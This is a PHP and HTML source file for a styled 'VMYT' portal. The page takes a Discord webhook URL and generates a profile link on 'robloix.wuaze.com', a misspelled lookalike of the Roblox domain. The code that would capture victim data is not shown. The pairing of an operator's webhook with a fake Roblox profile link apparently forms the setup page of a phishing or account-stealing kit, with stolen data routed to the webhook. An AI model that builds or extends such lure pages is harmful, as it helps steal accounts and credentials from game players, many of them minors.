<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['webhook'])) {
    $webhook = trim($_POST['webhook']);
    
    // Validate webhook URL
    if (filter_var($webhook, FILTER_VALIDATE_URL) && strpos($webhook, 'discord.com/api/webhooks/') !== false) {
        // Generate random profile ID
        $profileId = mt_rand(100000, 999999);
        
        // Store webhook and profile ID in session
        $_SESSION['webhook'] = $webhook;
        $_SESSION['profile_id'] = $profileId;
        
        // Create the custom profile URL
        $profileUrl = "robloix.wuaze.com/profile/" . $profileId;
        
        // Store profile URL in session
        $_SESSION['profile_url'] = $profileUrl;
        
        // Redirect to main.php
        header("Location: main.php");
        exit();
    } else {
        $error = "Invalid Discord webhook URL";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VMYT - Discord Integration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0a0f;
            color: #ffffff;
            overflow: hidden;
            height: 100vh;
        }

        .background-3d {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 50%, rgba(88, 101, 242, 0.3) 0%, transparent 50%),
                        radial-gradient(circle at 80% 20%, rgba(114, 137, 218, 0.3) 0%, transparent 50%),
                        radial-gradient(circle at 40% 80%, rgba(88, 101, 242, 0.2) 0%, transparent 50%),
                        linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            animation: backgroundShift 20s ease-in-out infinite;
        }

        @keyframes backgroundShift {
            0%, 100% { transform: translateX(0) translateY(0); }
            33% { transform: translateX(-10px) translateY(-20px); }
            66% { transform: translateX(10px) translateY(-10px); }
        }

        .network-lines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .network-line {
            position: absolute;
            background: linear-gradient(90deg, transparent, rgba(88, 101, 242, 0.3), transparent);
            animation: networkPulse 3s ease-in-out infinite;
        }

        .network-line:nth-child(1) {
            width: 200px;
            height: 1px;
            top: 20%;
            left: 10%;
            animation-delay: 0s;
        }

        .network-line:nth-child(2) {
            width: 150px;
            height: 1px;
            top: 60%;
            right: 20%;
            animation-delay: 1s;
        }

        .network-line:nth-child(3) {
            width: 100px;
            height: 1px;
            top: 80%;
            left: 30%;
            animation-delay: 2s;
        }

        @keyframes networkPulse {
            0%, 100% { opacity: 0.3; transform: scaleX(1); }
            50% { opacity: 0.8; transform: scaleX(1.2); }
        }

        .floating-nodes {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .node {
            position: absolute;
            width: 4px;
            height: 4px;
            background: #5865f2;
            border-radius: 50%;
            animation: float 8s ease-in-out infinite;
            box-shadow: 0 0 10px rgba(88, 101, 242, 0.5);
        }

        .node:nth-child(1) { top: 15%; left: 15%; animation-delay: 0s; }
        .node:nth-child(2) { top: 25%; right: 25%; animation-delay: 2s; }
        .node:nth-child(3) { bottom: 30%; left: 20%; animation-delay: 4s; }
        .node:nth-child(4) { bottom: 20%; right: 30%; animation-delay: 6s; }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }

        .container {
            position: relative;
            z-index: 10;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3),
                        0 0 0 1px rgba(255, 255, 255, 0.1);
            max-width: 450px;
            width: 100%;
            text-align: center;
            transform: translateY(0);
            animation: cardAppear 0.6s ease-out;
        }

        @keyframes cardAppear {
            from {
                opacity: 0;
                transform: translateY(20px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .header {
            margin-bottom: 32px;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            margin-bottom: 24px;
        }

        .discord-icon {
            width: 48px;
            height: 48px;
            background: #5865f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            animation: iconSpin 10s linear infinite;
        }

        @keyframes iconSpin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .title {
            font-size: 42px;
            font-weight: 800;
            background: linear-gradient(135deg, #5865f2 0%, #7289da 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.02em;
            text-shadow: 0 0 30px rgba(88, 101, 242, 0.3);
        }

        .subtitle {
            font-size: 16px;
            color: rgba(255, 255, 255, 0.7);
            margin-top: 8px;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: #ffffff;
            font-size: 16px;
            transition: all 0.3s ease;
            outline: none;
        }

        .form-input:focus {
            border-color: #5865f2;
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.1);
            background: rgba(255, 255, 255, 0.1);
        }

        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #5865f2 0%, #7289da 100%);
            border: none;
            border-radius: 12px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 24px rgba(88, 101, 242, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }

        .submit-btn:hover::before {
            left: 100%;
        }

        .error {
            background: rgba(248, 81, 73, 0.1);
            border: 1px solid rgba(248, 81, 73, 0.3);
            color: #f85149;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
        }

        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 2;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(88, 101, 242, 0.6);
            border-radius: 50%;
            animation: particleFloat 12s linear infinite;
        }

        @keyframes particleFloat {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) rotate(360deg);
                opacity: 0;
            }
        }

        @media (max-width: 768px) {
            .card {
                padding: 32px 24px;
                margin: 20px;
            }
            
            .title {
                font-size: 36px;
            }
        }
    </style>
</head>
<body>
    <div class="background-3d"></div>
    
    <div class="network-lines">
        <div class="network-line"></div>
        <div class="network-line"></div>
        <div class="network-line"></div>
    </div>
    
    <div class="floating-nodes">
        <div class="node"></div>
        <div class="node"></div>
        <div class="node"></div>
        <div class="node"></div>
    </div>
    
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <div class="card">
            <div class="header">
                <div class="logo">
                    <div class="discord-icon">🔗</div>
                </div>
                <h1 class="title">VMYT</h1>
                <p class="subtitle">Discord Integration Portal</p>
            </div>
            
            <?php if (isset($error)): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <form method="POST" action="">
                <div class="form-group">
                    <label for="webhook" class="form-label">Discord Webhook URL</label>
                    <input 
                        type="url" 
                        id="webhook" 
                        name="webhook" 
                        class="form-input" 
                        placeholder="https://discord.com/api/webhooks/..."
                        required
                    >
                </div>
                
                <button type="submit" class="submit-btn">
                    Connect & Generate Profile
                </button>
            </form>
        </div>
    </div>

    <script>
        // Create floating particles
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 12 + 's';
                particle.style.animationDuration = (Math.random() * 8 + 8) + 's';
                particlesContainer.appendChild(particle);
            }
        }

        // Initialize particles
        createParticles();

        // Add input validation and enhancement
        document.getElementById('webhook').addEventListener('input', function(e) {
            const input = e.target;
            const value = input.value;
            
            if (value.includes('discord.com/api/webhooks/')) {
                input.style.borderColor = '#00d26a';
                input.style.boxShadow = '0 0 0 3px rgba(0, 210, 106, 0.1)';
            } else if (value.length > 0) {
                input.style.borderColor = '#f85149';
                input.style.boxShadow = '0 0 0 3px rgba(248, 81, 73, 0.1)';
            } else {
                input.style.borderColor = 'rgba(255, 255, 255, 0.1)';
                input.style.boxShadow = 'none';
            }
        });

        // Form submission enhancement
        document.querySelector('form').addEventListener('submit', function(e) {
            const btn = document.querySelector('.submit-btn');
            btn.innerHTML = '<span style="opacity: 0.7;">Generating Profile...</span>';
            btn.disabled = true;
        });
    </script>
</body>
</html>